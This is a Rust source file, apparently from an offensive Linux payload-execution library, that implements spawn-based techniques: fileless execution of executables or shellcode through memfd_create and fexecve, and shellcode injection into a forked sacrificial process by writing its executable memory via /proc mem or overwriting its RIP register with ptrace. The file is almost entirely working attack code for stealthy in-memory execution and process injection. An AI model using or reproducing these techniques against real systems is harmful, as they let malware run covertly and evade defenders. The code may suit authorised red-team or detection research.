//! Techniques that execute a payload by spawning a new process.

use std::ffi::CString;
use std::os::fd::AsRawFd;

use exeutils::elf64;

use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
use nix::sys::ptrace;
use nix::sys::signal::kill;
use nix::sys::signal::Signal::{SIGCONT, SIGSTOP};
use nix::unistd::{self, execve, fexecve, fork, ForkResult};

use crate::error::{Error, Result};
use crate::payload::{Payload, PayloadType, Spawn};
use crate::primitives::procfs::{find_mem_region, mem_exec, mem_write};
use crate::primitives::ptrace::ptace_write_rip;
use crate::utils::{get_env, str_to_vec_c_string};

/// Uses memfd_create to create an anonymous file in memory, writes the payload to it,
/// and executes it. Shellcode is converted to an ELF before execution.
///
/// # Arguments
/// * `payload` - A `Payload<Spawn>` containing either an executable or shellcode
///
/// # Errors
/// Returns an error if:
/// - In-memory file creation fails
/// - Writing to in-memory file fails
/// - Process creation fails
///
/// # Examples
/// ```no_run
/// use linc::payload::{Payload, Spawn};
/// use linc::techniques::spawn;
///
/// // Execute an existing binary
/// let payload = Payload::<Spawn>::from_file("/path/to/payload")
///     .set_args(/* args */);
///     .unwrap()
///
/// spawn::memfd(payload).unwrap();
/// ```
pub fn memfd(payload: Payload<Spawn>) -> Result<()> {
    let anon_file_name = CString::new("")?;
    let p_file_name = anon_file_name.as_c_str();

    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;

    let bytes = match payload.payload_type() {
        PayloadType::Executable => payload.bytes().to_vec(),
        PayloadType::Shellcode => elf64::shellcode_to_exe(payload.bytes()),
    };

    unistd::write(&fd, &bytes)?;

    let args = str_to_vec_c_string(payload.args())?;
    let args_slice = args.as_slice();

    let env = get_env()?;
    let env_slice = env.as_slice();

    match unsafe { fork() } {
        Ok(ForkResult::Parent { child: _ }) => {}
        Ok(ForkResult::Child) => {
            fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
        }
        Err(error) => return Err(Error::Linux(error)),
    }

    Ok(())
}

pub fn procfs_overwrite_rip(payload: Payload<Spawn>) -> Result<()> {
    match unsafe { fork() } {
        Ok(ForkResult::Parent { child, .. }) => match payload.payload_type() {
            PayloadType::Executable => {
                return Err(Error::NotImplemented(
                    "function can not take executables".to_string(),
                ));
            }
            PayloadType::Shellcode => {
                // Stop the target process
                kill(child, SIGSTOP)?;

                // Find an executable memory region
                // ptrace and procfs mem can bypass memory permission
                // and write to non-writable memory
                let addr = find_mem_region(child, true, "r-x")?[0];

                // Write payload to executable memory
                mem_write(child, addr, payload.bytes())?;

                // Jump to payload
                mem_exec(child, addr)?;

                // Continue the target process
                kill(child, SIGCONT)?;
            }
        },

        Ok(ForkResult::Child) => {
            let target_c_string = CString::new(payload.target())?;

            let target_args = str_to_vec_c_string(payload.target_args())?;
            let target_args_slice = target_args.as_slice();

            let env = get_env()?;
            let env_slice = env.as_slice();

            execve(&target_c_string, target_args_slice, env_slice)?;
        }

        Err(error) => return Err(Error::Linux(error)),
    }

    Ok(())
}

/// Uses ptrace to inject shellcode into a sacrificial process by overwriting its RIP register.
/// Only works with shellcode payloads.
///
/// # Arguments
///
/// * `payload` - A `Payload<Spawn>` containing shellcode and target process configuration
///
/// # Errors
///
/// Returns an error if:
/// - The payload type is `Executable` (only shellcode is supported)
/// - Process creation or manipulation fails
///
/// # Examples
///
/// ```no_run
/// use linc::payload::{Payload, Spawn};
/// use linc::techniques::spawn;
///
/// let bytes = vec![/* shellcode bytes */];
///
/// // Inject shellcode into a sacrificial 'yes' process
/// let payload = Payload::<Spawn>::from_bytes(bytes)
///     .set_target("/usr/bin/yes")
///     .set_target_args("YES");
///     .unwrap()
///
/// spawn::ptrace_overwrite_rip(payload).unwrap();
/// ```
pub fn ptrace_overwrite_rip(payload: Payload<Spawn>) -> Result<()> {
    match unsafe { fork() } {
        Ok(ForkResult::Parent { child, .. }) => match payload.payload_type() {
            PayloadType::Executable => {
                return Err(Error::NotImplemented(
                    "function can not take executables".to_string(),
                ));
            }
            PayloadType::Shellcode => {
                ptace_write_rip(child, payload.bytes(), true)?;
            }
        },

        Ok(ForkResult::Child) => {
            ptrace::traceme()?;

            let target_c_string = CString::new(payload.target())?;

            let target_args = str_to_vec_c_string(payload.target_args())?;
            let target_args_slice = target_args.as_slice();

            let env = get_env()?;
            let env_slice = env.as_slice();

            execve(&target_c_string, target_args_slice, env_slice)?;
        }

        Err(error) => return Err(Error::Linux(error)),
    }

    Ok(())
}
